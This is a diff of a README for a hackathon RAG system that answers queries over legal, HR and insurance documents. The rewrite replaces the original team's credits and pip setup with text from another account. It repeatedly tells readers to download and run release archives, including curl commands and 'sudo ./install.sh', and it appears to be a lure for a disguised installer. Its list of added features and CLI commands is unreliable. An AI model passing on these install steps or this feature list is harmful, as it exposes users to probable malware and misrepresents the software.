@@ -1,199 +1,229 @@
-# 🚀 HackRx 6.0 — Intelligent Query Retrieval
+[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github&style=flat-square)](https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases)
 
-![HackRx 6.0 Banner](https://d8it4huxumps7.cloudfront.net/uploads/images/686eb5d3243dd_hackrx-60.jpg?d=980x520)
+# HackRx 6.0 — Intelligent Query Retrieval for Legal & HR
 
-> **A Next-Gen RAG System for Insurance, Legal, HR, and Compliance Document Intelligence**
+![HackRx banner](https://images.unsplash.com/photo-1559526324-593bc073d938?auto=format&fit=crop&w=1350&q=80)
 
----
+A production-ready, LLM-powered system for intelligent query retrieval from large documents. HackRx 6.0 processes PDFs, DOCX, and emails. It supports semantic search, clause matching, and outputs explainable JSON decisions for insurance, legal, HR, and compliance workflows.
 
-![Banner](https://img.shields.io/badge/python-3.9%2B-blue?style=flat-square) ![License](https://img.shields.io/github/license/KishoreMuruganantham/HackRx-6.0-Intelligent-Query-Retrieval?style=flat-square) ![FastAPI](https://img.shields.io/badge/FastAPI-Backend-green?style=flat-square) ![LangChain](https://img.shields.io/badge/LangChain-LLM-orange?style=flat-square)
+Badges
+- Topics: clause-matching · compliance · document-processing · docx · email · explainable-ai · faiss · hackathon · hr · insurance · intelligent-systems · json · legal · llm · pdf · pinecone · query-retrieval · semantic-search
+- License: MIT
 
-Intelligent Query Retrieval is a high-performance, explainable Retrieval-Augmented Generation (RAG) backend for extracting answers from large and complex documents (PDFs, DOCX, emails). Optimized for speed, semantic accuracy, and professional deployment.
+Table of contents
+- Features
+- Quick start
+- Command line examples
+- API examples
+- Architecture
+- Data flow
+- Supported formats
+- Explainable JSON output
+- Vector stores and embedding
+- Deployment
+- Contributing
+- Releases
 
----
+Features
+- Ingest large documents: PDF, DOCX, EML (email).
+- Chunking and overlap tuning for precise retrieval.
+- Language model-based semantic search and reranking.
+- Clause matching with rule-assisted heuristics.
+- Explainable JSON decisions for audit and compliance.
+- Plug-and-play vector stores: FAISS or Pinecone.
+- Batch and streaming processing modes.
+- Fine-grained access control hooks for enterprise use.
+- Exportable JSON that links findings to original document spans.
 
-## 👥 Team Details
+Quick start
 
-**Team Name:** Team Maverick
+1) Clone the repo
+- git clone https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval.git
+- cd HackRx-6.0-Intelligent-Query-Retrieval
 
-| Member                | Role          | GitHub                                           |
-|-----------------------|--------------|--------------------------------------------------|
-| Kishore Muruganantham | Team Leader  | [KishoreMuruganantham](https://github.com/KishoreMuruganantham) |
-| Mugundhan Y           | Member       | [MugundhanY](https://github.com/MugundhanY)      |
-| Mukundh A P           | Member       | [MukundhArul](https://github.com/MukundhArul)    |
-| Praveen Kumar R       | Member       | [praveen647](https://github.com/praveen647)      |
-| Prince Raj J          | Member       | [the-ai-developer](https://github.com/the-ai-developer) |
+2) Download and run the release installer
+- The release package at https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases must be downloaded and executed.  
+- Example (Linux):
+  - curl -L -o hackrx-6.0-linux.tar.gz "https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases/download/v6.0/hackrx-6.0-linux.tar.gz"
+  - tar -xzf hackrx-6.0-linux.tar.gz
+  - cd hackrx-6.0
+  - sudo ./install.sh
+- Example (Mac / Intel):
+  - curl -L -o hackrx-6.0-macos.tar.gz "https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases/download/v6.0/hackrx-6.0-macos.tar.gz"
+  - tar -xzf hackrx-6.0-macos.tar.gz
+  - ./install.sh
 
----
+If you prefer release browser, visit the Releases page here: https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases and download the installer asset that matches your OS.
 
-## 📋 Table of Contents
+Command line examples
 
-- [✨ Features](#features)
-- [⚡ Quick Setup](#quick-setup)
-- [🔗 API Usage](#api-usage)
-- [🔄 Retraining & Regeneration](#retraining--regeneration)
-- [📊 Dataset Insights](#dataset-insights)
-- [📑 License](#license)
+Indexing a document
+- hackrx index --file ./examples/employee_handbook.pdf --corpus hr-handbook --chunksize 1200 --overlap 200
 
----
+Search and retrieve
+- hackrx search --corpus hr-handbook --query "overtime pay policy" --topk 5
 
-## ✨ Features
+Clause match
+- hackrx match-clause --file contracts/contract_2024.docx --clause "termination for convenience" --threshold 0.7
 
-- **Multi-LLM Support**: Gemini, Groq, DeepSeek, OpenAI, and OpenRouter (via LangChain)
-- **Automated Document Processing**: Ingests PDFs and creates semantic vectorstores
-- **Robust Semantic Search**: FAISS-powered retrieval for clause matching and context-aware answers
-- **Explainable Responses**: Outputs JSON with traceable, document-grounded answers
-- **Lightning-Fast API**: Asynchronous, parallel processing for high throughput
-- **Secure & Tokenized**: API endpoints protected with token-based authentication
+Explain decision (JSON)
+- hackrx explain --query-id 12345 --format json
 
----
+Sample CLI session
+- hackrx ingest --dir ./inbox
+- hackrx embed --corpus inbox --backend faiss
+- hackrx query --corpus inbox --q "data breach notification rules" --topk 7
 
-## ⚡ Quick Setup
+API examples
 
-> **Requirements:** Python 3.9+, pip, API keys for supported LLMs
+REST: POST /v1/query
+- Request
+  - POST /v1/query
+  - Body: { "corpus": "insurance-policies", "query": "pre-existing condition exclusion", "topk": 10 }
+- Response (short)
+  - {
+      "query_id": "q_20250801_001",
+      "results": [
+        { "doc_id": "policy_123", "score": 0.92, "span": "Section 2.1..." },
+        ...
+      ],
+      "explain": { "model": "llm-embed-v1", "steps": ["embedding","retrieval","rerank"] }
+    }
 
-1. **Clone & Install**
-   ```bash
-   git clone https://github.com/KishoreMuruganantham/HackRx-6.0-Intelligent-Query-Retrieval.git
-   cd HackRx-6.0-Intelligent-Query-Retrieval
-   pip install -r requirements.txt
-   ```
+Webhook-based explainable JSON
+- Send results to a webhook that stores both raw spans and a human-readable rationale.
+- The JSON links to original files and byte ranges for audit.
 
-2. **Configure Environment**
-   - Add your API keys in a `.env` file or as environment variables:
-     ```
-     GOOGLE_API_KEY=your-google-api-key
-     GROQ_API_KEY=your-groq-api-key
-     DEEPSEEK_API_KEY=your-deepseek-api-key
-     OPENAI_API_KEY=your-openai-api-key
-     OPENROUTER_API_KEY=your-openrouter-api-key
-     VALID_TOKEN=choose-a-strong-token
-     ```
+Architecture
 
-3. **Run the Backend**
-   ```bash
-   python main.py
-   ```
-   *Default port: 8000. Ngrok tunnel supported for remote access.*
+![Architecture](https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1350&q=80)
 
----
+Core components
+- Ingestor: handles PDF, DOCX, and EML parsing. Extracts text, metadata, and attachments.
+- Chunker: splits text into chunks with configurable overlap.
+- Embedder: converts chunks to embeddings using selected LLM/embed model.
+- Vector store: FAISS for on-premise or Pinecone for managed cloud.
+- Retriever: nearest-neighbor search, optionally filtered by metadata.
+- Reranker: LLM-based reranker that orders candidates.
+- Clause matcher: rules + semantic matching to find clause equivalents.
+- Explainability engine: composes the final JSON decision with provenance and rationale.
+- API / CLI / Dashboard: expose endpoints and user interfaces.
 
-## 🔗 API Usage
+Data flow
+1. Upload raw files (PDF, DOCX, EML).
+2. Ingestor extracts text + metadata.
+3. Chunker creates indexable chunks.
+4. Embedder generates vectors.
+5. Vector store persists vectors and metadata.
+6. User query triggers retriever and reranker.
+7. Clause matcher runs pattern checks.
+8. Explainability engine builds JSON with source spans and decision steps.
+9. Output delivers matches and explanations.
 
-### 1️⃣ Health Check
+Supported formats
+- PDF: text and OCR-assisted text extraction.
+- DOCX: structured parsing and style-aware extraction.
+- EML (email): headers, body, attachments, MIME parsing.
+- Plain text, CSV import utilities.
 
-**Endpoint:** `GET /health`
-
-Returns status, cache info, and LLM pool size:
-```json
-{
-  "status": "healthy",
-  "cached_documents": 3,
-  "llm_pool_size": 2
-}
-```
-
----
-
-### 2️⃣ Document Ingestion
-
-**Endpoint:** `POST /doc`
-
-Add and cache a new document for retrieval (PDF URL as string):
-
-**Request:**
-```json
-{
-  "documents": "https://example.com/sample.pdf"
-}
-```
-
-**Response:**
-```json
-{
-  "message": "Document processing started",
-  "doc_id": "abcdef123456"
-}
-```
-If already cached:
-```json
-{
-  "message": "Document already processed",
-  "doc_id": "abcdef123456"
-}
-```
-
----
-
-### 3️⃣ Query Retrieval
-
-**Endpoint:** `POST /hackrx/run`  
-**Auth:** Bearer token (`VALID_TOKEN`)
-
-**Request:**
-```json
-{
-  "documents": "https://example.com/sample.pdf",
-  "questions": [
-    "What is the claim eligibility?",
-    "How to file a complaint?"
+Explainable JSON output (example)
+- {
+  "query_id": "q_20250801_001",
+  "query": "non-compete enforceability in CA",
+  "corpus": "legal-agreements",
+  "results": [
+    {
+      "doc_id": "nda_2021",
+      "score": 0.94,
+      "matches": [
+        { "span": "Clause 6(a): ...", "start": 1248, "end": 1320 }
+      ],
+      "rationale": "LLM detected jurisdiction-specific language that limits enforceability in California.",
+      "provenance": { "file_path": "agreements/nda_2021.docx", "byte_range": [1248,1320] }
+    }
+  ],
+  "explain_pipeline": [
+    { "step": "embed", "model": "embed-4", "time_ms": 120 },
+    { "step": "knn_retrieve", "index": "faiss", "candidates": 50 },
+    { "step": "rerank", "model": "llm-rank-2", "topk": 5 },
+    { "step": "clause_match", "rules_hit": ["jurisdiction_clause", "duration_limit"] }
   ]
 }
-```
 
-**Response:**
-```json
-{
-  "answers": [
-    "Eligibility for claims is outlined in Section 3...",
-    "To file a complaint, follow procedure X..."
-  ]
-}
-```
+Vector stores and embedding
+- FAISS: use for on-prem indices and fast local search. Configure index type based on corpus size.
+- Pinecone: use for managed scale and multi-region deployment.
+- Embedding models: choose open models or cloud providers. The system uses an interface so you can swap providers.
 
----
+Tuning tips
+- Chunk size: 800-1600 tokens works for dense legal text.
+- Overlap: 100-300 tokens to keep context across chunks.
+- TopK: 5-15 for reranking. Use higher values for thorough audits.
+- Reranker: enable when legal precision matters.
 
-### 4️⃣ Cache Management
+Security and governance
+- Role-based hooks: add gating before exports.
+- Audit trail: all decisions attach doc id and byte ranges.
+- Redaction pipeline: remove PII on ingest if needed.
 
-**Endpoint:** `DELETE /cache/{doc_hash}`
+Deployment
 
-Clear vectorstore cache for a document:
-```json
-{
-  "message": "Cache cleared for document: abcdef123456"
-}
-```
+Docker
+- docker build -t hackrx:6.0 .
+- docker run -p 8080:8080 -e VECTOR_BACKEND=pinecone hackrx:6.0
 
----
+Kubernetes
+- Provide a Deployment for api, a StatefulSet for FAISS index, and a Job for batch ingest.
+- Use HorizontalPodAutoscaler for API based on CPU or queue length.
 
-## 🔄 Retraining & Regeneration
+Cloud
+- Use managed Pinecone or vector DB as index.
+- Store raw files in S3 or equivalent and keep metadata in Postgres.
 
-- **Automatic:** Every new document triggers extraction, chunking, embedding, and vectorstore creation.
-- **Manual:** Use `DELETE /cache/{doc_hash}` then re-upload to force regeneration.
-- **Parallel Processing:** Async thread pools for document parsing and LLM querying.
+Monitoring
+- Collect metrics: indexing rate, query latency, embedding time.
+- Track explainability coverage: percent of queries with full JSON rationales.
 
-**Pipeline:**
-1. Download & extract text (PDF supported; see `get_pdf_text_cached`)
-2. Smart chunking for optimal context (`get_text_chunks_optimized`)
-3. Generate embeddings, build FAISS vectorstore (`create_vectorstore_optimized`)
-4. Cache in memory + disk for speed & persistence
+Examples and demo assets
+- examples/ contains sample PDF, DOCX, EML and a set of queries.
+- demo-notebook.ipynb shows step-by-step embedding and retrieval.
+- scripts/bulk_ingest.sh for batch uploads.
 
----
+Developer notes
+- Modular code. Swap embedder with any model implementing the interface.
+- Use environment variables for keys: PINECONE_API_KEY, OPENAI_API_KEY, etc.
+- Tests: run pytest tests/.
 
-## 📊 Dataset Insights
+Contributing
+- Fork the repo.
+- Create a feature branch.
+- Open a pull request against main.
+- Keep changes small and include tests for new features.
 
-- **Supported Formats:** PDF (fitz-based text extraction), with plans for DOCX & email
-- **Smart Chunking:** Overlapping ~1500-character chunks retain context for semantic search
-- **Semantic Search:** FAISS index enables rapid, high-accuracy retrieval
-- **Explainability:** All answers traceable to document content; if not found, responds:  
-  `"Information not available in the provided document"`
+License
+- MIT
 
----
+Releases
+- Download and run the release installer from the Releases page: https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases  
+- If an asset fails, check the Releases section on GitHub for the right file and version. The Releases page lists installers for Linux, macOS, and Docker images.
 
-## 📑 License
+Contact
+- Raise issues on GitHub.
+- For enterprise support, open an issue and tag it with "enterprise".
 
-Distributed under the MIT License. See [`LICENSE`](./LICENSE) for full text.
+Screenshots and visuals
+- UI mockups and sequence diagrams sit in docs/images/.
+- Use the banner image above for presentations and slide decks.
 
----
+Examples of real queries to test
+- "Does this policy exclude pre-existing conditions?"
+- "Find termination clauses with a 30-day notice window."
+- "Show GDPR-related data retention clauses in this contract set."
 
-> _Built for HackRx 6.0 by Team Maverick — Professional, Scalable, and Ready for Real-World Deployment!_
+Internal glossary
+- Chunk: a contiguous text segment indexed as one retrieval unit.
+- Retriever: component that finds candidate chunks by vector similarity.
+- Reranker: LLM step that scores candidates using context and query.
+- Explain JSON: structured output combining results, rationale, and provenance.
+
+This README guides you from install to production use. Visit the Releases page now to download and execute the release package that matches your platform: https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases
